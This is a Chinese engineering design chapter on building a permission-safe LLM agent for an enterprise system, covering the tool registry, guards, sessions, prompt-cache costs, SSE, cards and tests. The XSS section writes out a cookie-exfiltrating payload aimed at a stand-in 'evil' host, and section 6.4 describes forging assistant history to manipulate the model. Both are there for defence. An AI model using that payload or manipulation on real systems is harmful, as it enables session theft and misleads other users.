第六章　实现：模块划分、工具规范、上下文与成本

前五章定了原则，这一章把原则落成目录、函数签名、表结构和数字。判断标准很实际：把它交给一个没参与讨论的人，他能照着建出包、写出第一个工具、跑通第一条测试。

本章要解决的现状问题（逐条有出处）
  1. 996 行的 agent_router.py 同时是工具层、注册表、门控层、HTTP 客户端、循环、降级模板、配置接口和审计
  2. 工具定义在七个地方手工同步（6.3 逐个点名），加一个工具要改七处、还要发前端版本
  3. 聚合工具在已截断的明细上聚合、总数却用全量（agent_router.py:121-135）——线上正在出错数
  4. 历史存前端内存刷新即丢；截断纯按条数×字符，最坏单轮 3-5 万 token 无上限
  5. system prompt 第一句就插用户名和角色（:477）→ 跨用户缓存前缀共享为 0
  6. 模型返回体里的 usage 拿到手又丢掉（:502 → :524），成本至今只能靠猜

6.1　模块划分：backend/app/agent/ 包结构

拆包的第一原则不是"按技术分层"，而是按变更频率分。工具会天天加，红线守卫一年不动，模型配置随供应商变，会话装配随成本压力调。把变更频率差一个数量级的东西放进同一个文件，就会出现"加个工具顺手改了守卫"这种事故。

backend/app/agent/ ├─ registry.py 工具注册表：@tool 装饰器 / JSON Schema 自动生成 / 按域枚举 ├─ guard.py 红线守卫：current 非空断言、字段黑名单剔除、Top-N 截断、只读断言 ├─ tools/ │ ├─ __init__.py 仅做 import 触发注册（本包唯一允许的 import 副作用） │ ├─ purchase.py 采购域 → purchase_mgmt_router │ ├─ sales.py 销售/回款 → sales_router / leads_router │ ├─ orders.py 任务域 → orders_router │ ├─ finance.py 资金/报表 → reports_router（口径复用，不重写） │ ├─ warehouse.py 仓库域 → warehouse_router（现状零覆盖） │ └─ common.py 跨域：晨报聚合、项目全景 ├─ cards.py 卡片类型白名单 + 卡片构造器（facts 由服务端现查填入） ├─ llm.py 模型配置读库 + OpenAI 兼容 HTTP + usage 提取（请求级构造） ├─ prompt.py system prompt 拼装：稳定前缀 / 易变后缀严格分离 ├─ session.py 会话与消息落库、按 token 截断、旧轮工具结果压缩 ├─ sse.py SSE 事件编码（text delta / tool / card / done） └─ loop.py 自建门面：包 AgentScope ReActAgent + pre/post_acting 钩子

routers/agent_router.py 随之瘦身成纯 HTTP 层：POST /chat（SSE）、GET/PUT /config、GET /chat-logs、GET /sessions、GET /tools。现有的 _effective_llm_config（agent_router.py:762）、_mask_key（:776）、配置校验逻辑（:825-876）整段搬进 llm.py，接口层只剩参数校验和序列化。

依赖方向：单向，且不可逆

┌──────────────┐ │ main.py │ 装载 router 前先 import agent.tools └──────┬───────┘ ▼ ┌───────────────────────────────────────────────┐ │ routers/agent_router.py │ ← HTTP 层，只做编解码 └───────┬───────────────────────┬───────────────┘ ▼ ▼ ┌────────────┐ ┌─────────────┐ │ loop.py │◀────────▶│ llm.py │ 请求级构造，无模块级单例 └─────┬──────┘ └─────────────┘ │ 取工具/执行 ▼ ┌────────────┐ 装饰时套壳 ┌───────────┐ │ registry.py│─────────────▶│ guard.py │ 守卫在最内层，工具作者绕不过 └─────┬──────┘ └───────────┘ │ 注册 ▼ ┌────────────┐ 调用 + 传真实 current ┌────────────────────┐ │ tools/* │───────────────────────────▶│ routers/业务_router │ └────────────┘ ✗ 反向禁止 ✗ └────────────────────┘ │ ├─▶ session.py / prompt.py / sse.py / cards.py（被 loop 与 router 使用） └─▶ ✗ 禁止 import 任何 agent 之外的 app.routers 以外模块的私有实现
硬规矩：routers/* 永远不 import app.agent

反过来 agent/tools/* 可以（而且必须）import routers/*。这条不是洁癖：

  • 故障隔离——agent 包里一个 import 错误、一个第三方库版本冲突（AgentScope 迭代很快，第四章 4.3(d) 已经点名这个风险），不能让采购页面 500。反向依赖一旦建立，任何 agent 侧的问题都会变成全站问题。
  • 防止口径分叉——一旦允许 sales_router import agent，就会有人"顺手"在页面接口里调 agent 的聚合函数，于是同一个数字有了两条计算路径，早晚对不上。reports_router.py:411 那段防双算注释就是这类问题吃过亏的产物。
  • 唯一例外是启动顺序——tools/__init__.py 的 import 副作用必须在 main.py 装载 router 之前跑一次，否则注册表是空的。这一条写进 main.py 的注释，别指望后人猜。

另一条容易忽略的方向：guard.py 被 registry.py 依赖，不被 tools/* 依赖。工具作者不需要知道 guard 存在，也就没法"忘了调"。第四章 4.3(b) 说红线守卫要放在工具包装器最内层而不是只挂 pre/post_acting 钩子，落到代码上就是这个依赖方向——钩子挂在 Agent 上，换个 Agent 实现就没了；包装器长在注册表里，只要工具是注册进来的就绕不过。

6.2　工具设计规范（可直接当团队规范用）

命名：动词_域_对象

现状七个工具全是名词短语：po_arrival_overdue、balance_due、overdue_orders（agent_router.py:311-319）。名词短语的问题是模型看不出这是"查"还是"改"，人在审计日志里也看不出。改成 list_purchase_overdue / get_project_status / summarize_supplier_delay。

L3 引入卡片后，前缀承担更重的语义：propose_ 前缀专属于"生成待确认卡片"的工具，比如 propose_purchase_urge。这样 agent_chat_logs.tools_used（models.py:1118）里出现任何 propose_*，就意味着这一轮产生了提案，运维扫日志时一眼可见，不需要解析回答文本。

描述：写"什么时候该调"，不只是"它做什么"

模型选工具唯一的依据就是 description。现状全是功能说明，缺触发条件和边界。对照：

工具现状描述（agent_router.py:361-395）应该写成
morning_report"晨报聚合：采购到期未到货/部门逾期任务/尾款到期/人事到期 各 Top5 + 计数""当用户问『今天要盯什么』『有什么风险』『晨报』，或提出没有指明具体域的开放式问题时调用。返回四个域各 Top5 + 总数，用于概览；用户已经指明了域（如只问采购）时不要调它，改调该域的专用工具拿明细。"
po_overdue_by_supplier"到期未到货按供应商聚合：每家供应商的未收货条数、最大超期天数、涉及项目""当用户想知道是哪几家供应商在拖期、要不要约谈供应商时调用。只回汇总不回明细；用户要具体物料清单请改调 list_purchase_overdue。"
project_status"按项目编号查询项目进度：基本信息/各部门任务/未到货采购/尾款""用户消息里出现项目编号（形如 2501-012 或 TH-2501）时调用。没有编号不要猜，先反问用户要编号。"

最后一条尤其重要：规则降级路径好歹用正则抓编号（agent_router.py:551），LLM 路径完全靠模型自觉，描述里没有任何"没编号怎么办"的指引——模型很容易编一个编号去查，再如实回答"查不到"，用户看到的是"这助手连我们项目都不认识"。

参数 schema 最小化

规则：能从上下文推的不做参数；跟身份和权限有关的绝对不做参数。

现状有个活标本：tool_overdue_orders(db, dept, allowed_depts)（agent_router.py:168-169）。allowed_depts 是权限参数，却出现在函数签名上——它现在之所以安全，只是因为它没被写进 TOOL_SCHEMAS（:384-389），模型看不见。靠"忘了写进 schema"来保证安全，不是设计。正确做法是让它由 preset_kwargs 从真实 current 推导，或者干脆消失——因为一旦按第三章原则①去调 orders_router 的列表函数并传真实 current，部门收窄和 worker_id == current.id 的行级过滤（orders_router.py:317）自动就继承了，根本不需要这个参数。

返回值裁剪：4-6 个字段，Top-20 硬上限

现状 tool_po_arrival_overdue 返回 7 个字段 × 20 行（agent_router.py:86-93），而 system prompt 第 4 条却要求模型"从工具字段里挑最有用的 4-6 列"（agent_router.py:481）——这是把裁剪工作外包给模型：多出来的字段照样计费、照样进上下文、照样有泄露风险，只是最后没显示。裁剪必须在服务端做完，模型看到什么就该是要展示什么。

Top-20 是红线，不是偷懒

这个系统有独立的导出审批闸门：export_requests 表（models.py:481-490），开关打开后导出要走 pending → approved 流程（完整论证与"开关默认关但必须按会被打开来设计"的注意事项见第五章 5.2.4）。这里只强调一条实现含义：Top-N 的 N 不是拍脑袋定的，它由"这个系统的批量导出闸门卡在哪"倒推——换个没有导出审批的客户，N 可以放宽；这个客户不行。

一个工具只做一件事——以及本项目的真实 bug

tool_po_overdue_by_supplier（agent_router.py:121-135）的写法是：

d = await tool_po_arrival_overdue(db, min_overdue_days=0)   # :123
#   d = {"count": 全量条数, "items": rows[:20]}              # 见 :93
for it in d["items"]:                                       # :125 只遍历前 20 条
    ...按 supplier 累加 count / max_over_days / projects...
return {"count": len(rows), "item_total": d["count"], ...}  # :135 全量条数

后果很具体：假设全库 87 条逾期，供应商甲占 30 条但只有 12 条挤进按超期天数排序的 Top-20。页面显示"甲：12 条"，表头却写"共 87 条"——两个数字来自不同样本，怎么都对不上。更糟的是"哪家拖期最狠"这个排序在总数超 20 时本身就失真：一家有 25 条中度逾期的供应商，可能一条都进不了按 max_over_days 排的 Top-20。

规范条款因此写成：聚合类工具必须自己跑聚合查询，禁止在另一个工具的截断结果上二次加工。截断是"给模型看的裁剪"，不是"数据集"，两者混用必然出错。

错误返回 {"error": ...}，不抛异常

现状已经做对了，保留：_deny()（agent_router.py:404-406）把无权访问包装成 {"error": "你无权查询该域数据（需要 采购管理 菜单权限）"} 作为工具返回值回灌。理由是抛异常会让整轮对话失败、用户看到"请求失败"；回灌错误则让模型转述成一句人话。副作用是模型可能重试同一个工具——用轮次上限兜住（现状 for _ in range(4)，agent_router.py:522）。

JSON Schema 自动生成

用 inspect.signature + typing.get_type_hints(include_extras=True) 遍历参数，逐条处理：

  • 参数名在 _INJECTED = {"db", "current"} 白名单里 → 跳过，不进 schema（这是"权限参数不可见"的机械保证，不再依赖人记得）
  • int / float / str / bool → 直接映射；Literal["design","electric","produce"] → enum；其余复杂类型 → 直接在注册时抛异常（启动即失败，而不是运行时才发现模型传了个乱七八糟的对象）
  • Annotated[T, "描述"] 的第二项作为 description；没写描述 → 注册时抛异常
  • 有默认值 → 不进 required
  • 生成后按参数名排序，整个注册表按工具名排序，序列化统一 json.dumps(..., sort_keys=True)——顺序稳定是 prompt 缓存的前提，见 6.5

装饰器返回的不是原函数，而是 guard.wrap(fn, meta)，包装器内部依次做：current 非空断言 → 调用原函数 → 递归剔除黑名单字段与 JSON 自由列 → 列表字段 Top-N 截断并补 truncated: true → 会话 dirty 检查（有未提交的写操作直接抛，把"只读"从口头约定变成运行期断言）。工具作者写不出绕过它的代码——除非不用装饰器，而没有装饰器的函数根本不在注册表里，模型看不见。

6.4　上下文与会话管理

现状三个问题

三个问题，都在同一段代码里
  • ① 历史存前端内存。AgentView.vue:33 的 messages 是个 ref，刷新即丢；每轮由前端把最近 20 条回传（:156-160），后端再截一次（agent_router.py:945）。后果不只是换设备丢上下文，更要紧的是历史内容由客户端控制——用户可以伪造一条 assistant 消息（"你刚才说全公司尾款合计是 XXX"）诱导模型。事实源在工具返回值里（第三章原则②）能兜住数字不被编造，但会污染模型对意图的判断，L3 里还会影响它决定"该不该出这张卡"。
  • ② 截断纯按条数 × 字符。agent_router.py:945：h.content[:2000] for h in body.history[-20:]。20 条 × 2000 字符 = 最坏 4 万字符，中文按 ~1 token/字算就是 3-5 万 token 的历史，再叠工具结果直接超窗 400——而 400 会被 :957 的宽泛 except 吞掉降级成规则模式，用户只看到一个"规则模式"小标签，不知道发生了什么。
  • ③ 工具结果只增不减。:531-545 每轮把 assistant 的 tool_calls 和全部 tool 结果 append 进 messages，下一轮整包重发。4 轮循环的第 4 次请求带着前 3 轮全部工具 JSON；每轮最多 4 个工具（:532）× 每个 20 行，最坏光工具结果就 3 万 token 以上。

会话表结构

agent_sessions   (id, user_id, title, created_at, updated_at, archived)
agent_messages   (id, session_id, seq, role, content, tool_name, tool_call_id,
                  tokens, created_at)

三点设计说明：

  • tool 角色的消息单独成行，content 存工具返回的 JSON 原文——审计需要原始值（"当时给模型看的到底是什么"），但装配上下文时可以按新鲜度改写。存的和用的不必相同。
  • agent_chat_logs 不合并进来。它是"按请求"的审计粒度（models.py:1108-1122），agent_messages 是"按消息"的会话粒度。不合并的实际理由：会话被用户删掉后，审计记录必须还在——这是内控要求，不是技术偏好。
  • tokens 列在写入时就算好，装配时直接累加，不用每次重算。

按 token 截断，不按字符

装配顺序固定：稳定前缀（system + tools，约 1k）→ 当前问题 → 倒序回填历史直到额度用尽。估算器不需要精确，中文 1 字 ≈ 1 token、ASCII 4 字符 ≈ 1 token 的粗算误差在 10% 以内，够用；真值等审计表记上 prompt_tokens 之后（见 6.5）再回来校准系数。

一条硬规矩：截断必须以整条消息为单位，禁止截断消息中间。现状 content[:2000] 会从一个 markdown 表格中间切断，模型看到半张表会照着这个残缺格式继续写——用户拿到的是一张列数对不上的表。宁可整条丢掉。

工具结果的"新鲜度"分级

轮次上下文里保留什么典型 token
本轮完整 JSON（Top-20 全字段）~2000
上一轮压缩摘要："list_purchase_overdue → 87 条，最严重：XX 物料超期 12 天（供应商甲）"~40
更早一行元信息："曾调用 list_purchase_overdue"~10

为什么更早的还要留一行：system prompt 第 5 条已经在要求模型"拿到工具结果后直接总结，不要重复调用同一工具"（agent_router.py:482）。要它遵守这条，它得知道自己调过什么——但不需要三轮前的 20 行明细。保留意图、丢弃数据，这是多轮 Agent 上下文压缩最通用的一条经验。

只增不减还有一条更狠的对策：同一工具在同一会话里被重复调用时，只保留最后一次的完整结果，之前的一律降为元信息。这个规则在"晨报 → 追问采购 → 再追问尾款"这类真实路径上，能砍掉多轮里最大的一块 token。

6.5　成本模型与 prompt 缓存

成本形态：短问题 + 大 system + 多轮工具结果

先把一次问答的 token 账算清楚。一次工具调用 = 两次 HTTP 请求（第一次模型决定调工具，第二次模型看着结果作答）：

组成第 1 次请求（输入）第 2 次请求（输入）
system prompt（agent_router.py:477-484，约 350 汉字）~400~400
工具 schema × 7（:361-395）~600~600
历史（典型 10 条）~3000~3000
本轮问题~20~20
assistant 的 tool_calls 回灌—~80
工具结果（20 行 JSON）—~2000
输入合计~4020~6100
输出~30（只是 tool_calls）~900（markdown 表）

一问一答：输入约 10,100 token，输出约 930 token——输入是输出的 11 倍。这是所有"问数型 Agent"的通用形态。结论也就通用：优化输出长度几乎没有意义，优化输入结构才有意义。很多团队第一反应是"让模型少说点"，方向就错了。

月度成本估算方法

月输入 token = 人数 × 日均问答数 × 单问输入 token × 工作日数
月输出 token = 人数 × 日均问答数 × 单问输出 token × 工作日数
月成本 = 月输入 × (命中率 × 单价_cached + (1-命中率) × 单价_in) + 月输出 × 单价_out

代入本项目：40 人 × 5 问/天 × 22 天 = 4400 问/月 → 输入 44.4M token、输出 4.1M token。按「输入 ¥2/百万、缓存命中 ¥0.2/百万、输出 ¥8/百万」这个量级估（2026 年国产 OpenAI 兼容模型的常见档位；实际必须以你自己供应商的价目表为准，这里只演示算法）：

场景输入费用输出费用月合计
无缓存（=现状）44.4M × ¥2 = ¥88.84.1M × ¥8 = ¥32.8≈ ¥122
缓存命中 60%26.6M×¥0.2 + 17.8M×¥2 = ¥40.9¥32.8≈ ¥74（省 39%）

这个数字的意义不是"贵"，恰恰相反：便宜到不该为省钱牺牲正确性——不要为了省 token 去砍权限校验、砍二次核验、砍审计。但它会随人数、轮数、prompt 长度线性增长，而 L3 要加卡片说明、判断规则、更长的 system prompt，单问输入很容易翻倍到 2 万；再叠上人数从 40 涨到 200，就是 ¥122 → ¥1200 的量级。所以缓存要在成本还小的时候就做对，而不是等账单变难看再回头改结构。

缓存是前缀匹配——现状三处破前缀

主流供应商的自动前缀缓存机制是一样的：从第一个 token 开始逐段哈希，命中到第一个不一致处为止。任何一个字节的变化，都让它后面的全部内容失效。参与哈希的顺序通常是 tools → system → messages。对照现状：

#破坏源位置后果
1system prompt 第一句就插 {user_name} / {roles}agent_router.py:477、:515「当前服务对象：「王芹」（角色：buyer、finance、logistics）」出现在第 30 字符左右 → 跨用户前缀共享 = 0。40 个人问同一个问题，40 份独立缓存
2system prompt 末尾 今天日期：{today}agent_router.py:484位置虽在 system 末尾，但仍在历史之前 → 每过一天，全体用户的整段 system+tools 缓存作废。比 ① 更隐蔽，因为它"看起来已经放在末尾了"
3按用户菜单裁剪工具 schema 列表agent_router.py:518-519采购员 4 个工具、财务 3 个、admin 7 个，tools 参数逐字节不同；而 tools 排在最前参与哈希 → 即使修好 ①②，跨用户前缀依然是 0

修法

  1. 稳定内容全部提到最前：六条规则、输出格式要求、表格列数要求——这些跨用户、跨天完全一致，是唯一值得缓存的大块。
  2. user_name / roles / today 挪出 system，放到首条 user 消息的开头（或 system 数组的最后一个 block）。模型服从性没有可测差异，缓存前缀却从"零共享"变成"全体共享"。
  3. 工具 schema 全量下发，不按用户裁剪；权限仍由运行期门控兜住——现状本来就是双保险，:517 的注释自己写着"_run_tool 内仍二次门控"。代价是模型偶尔调用无权工具，拿到 {"error": ...} 后转述一句"你没有这个权限"，多花一轮约 6k token。这笔账要算给自己看：7 个工具的规模下裁剪省的 schema token 约 300，远小于毁掉的缓存收益；等工具涨到几十个、无权调用变频繁时，再改成"按域分组下发"（同一菜单组合共享同一份 tools）。
  4. 序列化顺序必须稳定：工具按 name 排序、参数按名排序、json.dumps(sort_keys=True)。现状 TOOL_SCHEMAS 是手写列表（:361）顺序天然固定，看似没问题；但一旦改成 registry 自动生成，字典遍历顺序就成了隐患——Python 3.7+ 的 dict 保插入序，而插入序取决于 import 顺序，改一行 tools/__init__.py 就可能让全量缓存失效。这种 bug 不报错、只涨钱，极难发现。

用 agent_chat_logs 实测校准

现成的数据被丢掉了

_llm_request 返回的是完整响应体（agent_router.py:502 return r.json()），OpenAI 兼容响应里的 usage 字段（prompt_tokens / completion_tokens，多数供应商还带 prompt_cache_hit_tokens）就在里面。但 _chat_with_llm 只取 data["choices"][0]["message"]（:524），usage 原样丢弃。不需要新增任何外部依赖，只需要不丢它。

给 agent_chat_logs（models.py:1108-1122，现有字段是 问/答/工具/方式/模型/耗时）加四列：prompt_tokens / completion_tokens / cached_tokens / rounds。一周后就能用真实数据替换上面所有估算，并直接算出两个关键指标：

  • 缓存命中率 = cached_tokens / prompt_tokens。修完 prompt 结构后，这个比值应该从接近 0 涨到 0.5 以上。涨不上去，说明还有别的前缀破坏源——这是一个可以证伪的验收标准，比"我觉得优化了"强得多。
  • 轮次分布。rounds 长期贴着上限 4（:522）说明模型在反复试探，多半是 description 没写清"什么时候该调"，回到 6.2 改描述，比调模型参数有效。

顺带一提，这四列还解决了另一个问题：现状 30s 超时是每请求级别（agent_router.py:499），4 轮循环没有全局 deadline，最坏 120s 以上——有了 rounds 和 duration_ms 的联合分布，才能给全局 deadline 定一个有依据的值，而不是拍脑袋。完整的五层预算设计（单请求 / 单轮 / 单工具 / 会话 token / 日成本）见第十章 10.6；本节算的是"稳态一个月多少钱"，而第十章 10.8 算的是另一笔账——成本的放大效应：L2 定时推送把"人问才花钱"变成"不问也花钱"，这笔账在这里是看不见的。

6.6　流式与前端卡片渲染

SSE 事件设计

event: meta        {"session_id": "...", "model": "deepseek-chat"}
event: tool_start  {"name": "list_purchase_overdue", "label": "采购到期未到货"}
event: tool_end    {"name": "list_purchase_overdue", "rows": 20, "ms": 340}
event: delta       {"text": "到期未到货共 "}
event: card        {"type": "po_urge", "card_id": "...", "title": "...",
                    "facts": {...}, "note": "...", "expires_at": "..."}
event: done        {"sources": [...], "suggestions": [...], "usage": {...}}
event: error       {"message": "...", "fallback": true}
  • tool_start / tool_end 不是装饰。现状前端只有三点动画（AgentView.vue:242-249），30 秒里用户完全不知道发生了什么。把"正在查采购到期未到货…"打出来，等待感和信任感都不一样——而且这些事件本身就是给用户看的数据来源审计，比事后在气泡下面挂一行小字（:227-230）更有说服力。
  • card 的 payload 完全由服务端构造，不来自模型输出流。模型只决定"要出一张什么类型的卡"（第三章原则③：能力可枚举），facts 由服务端在发事件前现查业务接口填入。这是原则②"事实源在服务端"落到传输层的样子。
  • 降级也走 error 事件，不要走 HTTP 状态码。现状降级是在一个宽泛 except 里完成的（agent_router.py:957），用户只看到一个"规则模式"标签；改成事件后，前端可以明确显示"大模型暂时不可用，已切换到规则模式"，并把原因（_fallback_reason，:895 已经算好了 timeout / http-500 之类）一并带出。

卡片渲染器：白名单在前端可信代码里

// 类型 → 组件：白名单，写死在前端源码里
const CARD_COMPONENTS = { po_urge: PoUrgeCard, balance_remind: BalanceCard }
// 类型 → 端点：同样写死。端点字符串永远不出现在模型输出里
const CARD_ENDPOINTS  = {
  po_urge: (id) => `/api/purchase-mgmt/items/${id}/urge`,
}

未知 type 一律渲染成"不支持的卡片类型（请升级客户端）"，绝不 fallback 到"把 payload 当 HTML 渲染"。这一条要写进代码注释，因为它在赶工期时是最容易被"临时放开一下"的地方。

facts 与 note 的视觉分离：facts（服务端权威事实：单号、供应商、超期天数、金额）用表格 + 正文色；note（模型写的一两句建议）用灰字 + 「AI 建议」标签，并且永远排在 facts 下面。这不是审美问题，是责任划分——出了错，用户能一眼看出哪部分是系统查的、哪部分是模型说的。这一点在向业务方演示时，比任何"我们做了权限控制"的口头保证都管用。

确认前二次拉取权威事实：点「确认」时先 GET 一次权威数据，与卡片生成时的快照比对；不一致则不提交，原地刷新并提示"数据已变化，请复核"。卡片可能在屏幕上躺了十分钟，期间货已经到了、款已经收了。这个系统的逾期扫描器本身就有"业务时间 < 15:00 跳过"这类时间敏感特判（overdue.py:317-321，理由是货车中午才发车、早上提醒多为误报），说明业务方对"什么时候算逾期"极其敏感，陈旧提案会直接损伤信任。

令牌过期：卡片带服务端签发的短时效 token（如 15 分钟），过期后按钮置灰。但要说清楚——这不是安全边界。真正的边界是"请求用人自己的 token 打现有业务端点、后端照常鉴权"（第三章原则一与原则三）；令牌只防陈旧提案被误点，属于体验保护，不要当防线来宣传。

XSS：为什么不能放开 markdown-it 的 html:false

这条链路上唯一的防线

AgentView.vue:21 的 new MarkdownIt({ html: false, linkify: true, breaks: true }) 配 :224 的 v-html="renderMd(m.content)"。html:false 让 markdown-it 把原始 HTML 转义成实体——这是整条链路上唯一的 XSS 防线，没有 DOMPurify、没有 CSP 兜底。

攻击链非常具体：工具返回值里的 item_name / supplier / customer / project_name 全部来自业务表，任何有采购录入权限的人都能把某个物料名称填成 <img src=x onerror="fetch('//evil/?c='+document.cookie)">；模型会老老实实把它抄进 markdown 表格的一格；如果 html:true，别人只要问一句"采购未到货"，就在自己的浏览器里执行了这段脚本。

注入点（采购录入）和触发点（另一个人问一句话）完全分离，触发者是无辜第三人——这是教科书式的存储型 XSS，只是中间多了个模型当搬运工。而且这个系统是 Electron 桌面客户端，渲染进程拿到的能力比浏览器标签页更多。

规矩：html 永远 false。将来若需要富文本（比如带样式的对比块），走卡片组件，不走 markdown；卡片 payload 用 {{ }} 插值（Vue 默认转义），不用 v-html。

6.7　测试策略：Agent 怎么测

本项目测试约定

AGENTS.md:21 写得很清楚：cd backend && .venv/bin/python tests/<name>.py——独立 asyncio 脚本 + 临时 SQLite，不是 pytest。每个脚本自己 mkdtemp()、设 DATABASE_URL、create_all、seed、用 httpx.ASGITransport 打进程内 app，最后 sys.exit(1 if FAIL else 0)。系统 python3 是 3.9，缺 aiosqlite 会直接炸，必须用 backend/.venv/bin/python（3.12）。已有的 backend/tests/test_agent_perms.py、test_agent_chat.py、test_agent_chat_logs.py 就是这个形态，照抄即可。

① 权限断言测试（最重要）

同一个问题、不同身份问、断言返回的行与字段跟页面一致。这是 Agent 唯一真正必须测的东西——模型答得漂不漂亮无所谓，多给一个人看到一行不该看的数据就是事故。

已有的 test_agent_perms.py（160 行）断言的是域级门控（有没有 purchase_mgmt 菜单）。L3 之前必须补的是行级断言：

用例造数断言对齐的页面口径
采购按 buyer_id建两个 buyer：一个纯 buyer，一个 buyer+finance+logistics（王芹型）；各造若干采购明细问"采购未到货"，各自只看到 buyer_id==自己 的行；兼任 finance/logistics 不解除隔离purchase_mgmt_router.py:46 _buyer_restricted、:349

断言写法：集合包含，而不是写死行数

不要断言"返回 3 行"。断言 Agent 返回的项目编号集合 ⊆ 用同一个 token 调页面接口返回的集合。这样页面口径变了（业务经常变），测试自动跟随，不会出现"两边各写一份口径、改了一边忘了另一边"——而这恰恰是这个 Agent 最初出问题的根因。

② 工具单测（脱离 LLM）

直接 await agent_router.tool_xxx(db, current)。这一层已经有了：test_agent_chat.py:277-308 就是直接调 6 个工具函数，不经过任何模型。新工具照抄这个形态即可——成本极低、跑得极快、能覆盖口径 bug。

6.2 里那个 po_overdue_by_supplier 的双口径 bug，一条断言就能锁死：造 25 条同供应商逾期，断言 sum(每家 count) == item_total。这条断言现在跑就会红。

③ 规则降级路径测试

test_agent_chat.py:17 的 os.environ.pop("AGENT_LLM_API_KEY", None) 强制走关键词匹配路径。这条测试的价值被低估了——它是唯一不依赖外部服务、能在 CI 里稳定跑的端到端路径，实际上把"权限门控 + 工具口径 + 格式化"三层一起验了。

L3 之后要补一条新断言：规则路径不生成卡片。理由是规则路径没有"判断"能力，只有关键词匹配，让它出提案卡片等于让 if "尾款" in msg 去决定要不要催客户付款。断言响应里不含 card 事件，把这条钉死。

④ 卡片契约测试

核心断言：facts 必须来自服务端重查，而不是卡片快照。两条用例：

  • 生成一张卡片 → 直接改库里的源数据（比如把 expected_arrival 往后推）→ 调"确认前校验"接口 → 断言返回 stale=true 且拒绝提交。
  • 把卡片 payload 里的端点和金额都篡改后提交 → 断言后端不认。因为端点由类型在可信前端代码里决定、金额由服务端重查，篡改结构上无效——这条测试是在验证"能力可枚举"这个设计真的落地了，而不是只写在文档里。

不测什么，也要写清楚

不要把「模型是否选对了工具」写成单测

那是评测（eval），不是单测：波动大、依赖外部服务、失败了也不该阻塞发版。要做的话单独放 backend/evals/，人工触发，用固定 20 条问题跑通过率，作为改 prompt 时的参考，不进 CI。把评测和单测混在一起，结果是 CI 时红时绿，两周后所有人开始无视 CI——这比没有测试更糟。

  1. 命名 动词_域_对象；产生提案的工具一律 propose_ 前缀，且只生成待确认卡片
  2. description 必须包含什么时候该调与不该调时改调谁，不是只写功能
  3. 参数只留模型真正需要决定的；身份、租户、部门一律由框架注入，不进 schema
  4. 返回 4-6 个字段、硬上限 N 行（N 由该系统的批量导出闸门倒推，不是拍脑袋）
  5. 一个工具一件事；聚合工具自己跑聚合，禁止在别的工具的截断结果上二次加工
  6. 错误返回 {"error": 人话} 回灌给模型转述，不抛异常
  7. 七不准：不写 SQL、不自建会话、不判角色、不返回自由 JSON 列、不返回黑名单字段、不做写操作、不接收权限参数
registry 三条
  1. 一处定义：name / label / domain / when / 参数 / followups / top_n，其余全部由它生成
  2. schema 自动生成且顺序稳定：注入参数走白名单跳过；缺描述、类型不支持一律注册时抛异常（启动即失败，好过线上才发现）；按名排序 + sort_keys=True
  3. 前端标签从接口拉，不硬编码：客户端版本会长期滞后，硬编码的标签会长期错位
缓存三条
  1. 稳定内容（规则、格式要求）放最前
  2. 身份、角色、日期放最后（system 末尾之后，或首条 user 消息里）
  3. 工具列表全量下发且有序；按用户裁剪省的是零头，毁的是全部缓存
上线前必须有的四个数字

单问输入 token、单问输出 token、缓存命中率、月度成本。没有这四个数字的 Agent 项目，成本失控只是时间问题——而且失控时你连"到底是哪个环节涨的"都答不上来。这四个数字全部可以从模型响应的 usage 字段直接得到，不需要任何额外基建；本项目现在已经拿到了这个字段，只是丢掉了（agent_router.py:502 → :524）。

落地顺序（对现场交付尤其重要）

顺序做什么工作量为什么排这个位置
0改 prompt 结构，把身份和日期后置半天先做不改任何业务语义、出不了事故，一周后就能拿出一张真实的成本对比图。现场交付第一周最需要的就是可量化的成果
1registry + guard 骨架1 天后面每个工具都建立在它上面，越晚做迁移成本越高
2迁移现有 7 个工具（改成调 router + 传 current）0.5 天/个这一步同时修掉线上的行级越权 P0，优先级由风险决定而不是由计划决定
3补权限断言测试1 天紧跟第 2 步，趁口径还在脑子里
4会话表 + 按 token 截断1 天这时才有真实 token 数据支撑参数选择
5SSE 流式1 天体验提升，无风险
6卡片（L3）按卡片类型逐个上最后必须建立在前面全部完成之上；先上一种卡片跑两周再上第二种

这个顺序里最反直觉的是把「改 prompt 结构」排在第 0 位——它既不是最重要的（第 2 步的越权才是），也不是最难的。排在最前的理由是交付节奏：它零风险、一周出数、能直接向客户证明"这个人动手之后确实有变化"。P0 越权修复反而不适合放第一周，因为它需要先有 registry 和测试兜底，草率动手容易在修一个洞的同时开另一个。技术优先级和交付优先级不是一回事，两者都要照顾——这大概是 FDE 与纯后端工程师最大的思维差别。
